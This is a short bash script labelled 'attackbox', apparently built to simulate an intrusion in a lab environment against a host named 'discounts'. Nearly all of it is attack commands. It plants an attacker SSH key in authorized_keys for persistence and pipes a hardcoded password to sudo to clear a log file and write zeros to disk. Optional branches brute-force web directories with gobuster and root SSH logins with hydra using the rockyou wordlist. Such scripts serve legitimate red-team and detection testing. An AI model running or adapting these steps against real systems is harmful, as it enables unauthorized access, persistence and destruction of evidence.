#!/bin/bash
echo "Starting attackbox..."

echo "attempt to copy attacker key to discounts...."
scp -o StrictHostKeyChecking=no ./keys/attacker-key.pub test@discounts:/home/test/.ssh

echo "attempt to update authorized_keys to have attacker key..."
ssh -o StrictHostKeyChecking=no test@discounts /bin/bash <<EOT
cat /home/test/.ssh/attacker-key.pub >> /home/test/.ssh/authorized_keys
exit
EOT

echo "attempt to clear log file and zero out unallocated disk space"
ssh -o StrictHostKeyChecking=no -i ./keys/attacker-key test@discounts /bin/bash <<EOT
echo "test" | sudo -S cp /dev/null /var/log/alternatives.log
echo "test" | sudo -S dd if=/dev/zero of=tempfile bs=1000000 count=10
exit
EOT

if  [ "${DIRBUSTER}" = true ];
then
echo "I invoked gobuster!"
./gobuster dir -u http://discounts:5001 -w /usr/share/wordlists/rockyou.txt
fi

if  [ "${BRUTEFORCE}" = true ];
then
echo "I invoked hydra!"
hydra discounts ssh -l root -P /usr/share/wordlists/rockyou.txt -s 22 -vV
fi


echo "done!" && sleep 3500